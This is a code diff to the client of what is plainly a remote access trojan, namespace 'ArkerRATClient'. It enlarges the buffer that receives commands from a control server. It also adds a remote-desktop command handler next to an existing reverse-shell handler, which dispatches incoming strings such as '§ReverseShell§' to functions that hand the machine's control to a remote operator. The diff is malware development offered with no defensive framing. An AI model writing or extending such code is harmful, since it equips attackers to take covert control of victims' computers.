@@ -50,7 +50,7 @@ namespace ArkerRATClient
             {
                 while (!noConnection)
                 {
-                    byte[] data = new byte[1024];
+                    byte[] data = new byte[131072];
                     await serverStream.ReadAsync(data, 0, data.Length);
                     DecideCyberTool(Encoding.UTF8.GetString(data, 0, data.Length).Trim('\0'));
                     await serverStream.FlushAsync();
@@ -90,7 +90,6 @@ namespace ArkerRATClient
             {
                 byte[] data = Encoding.UTF8.GetBytes(textData);
                 await serverStream.WriteAsync(data, 0, data.Length);
-                Encoding.UTF8.GetString(data, 0, data.Length);
                 await serverStream.FlushAsync();
             }
             catch (Exception ex)
@@ -105,6 +104,13 @@ namespace ArkerRATClient
             if (data.Contains("§ReverseShell§"))
             {
                 ReverseShell.reverseCMDSession(data.Replace("§ReverseShell§", ""));
+            }
+
+            if (data.Contains("§RemoteDesktop§"))
+            {
+                string tempString = data.Replace("§RemoteDesktop§", "");
+                RemoteDesktop.data = tempString;
+                await RemoteDesktop.RemoteDesktopFunction();
             }
 
             if (data.Contains("§Ping§"))
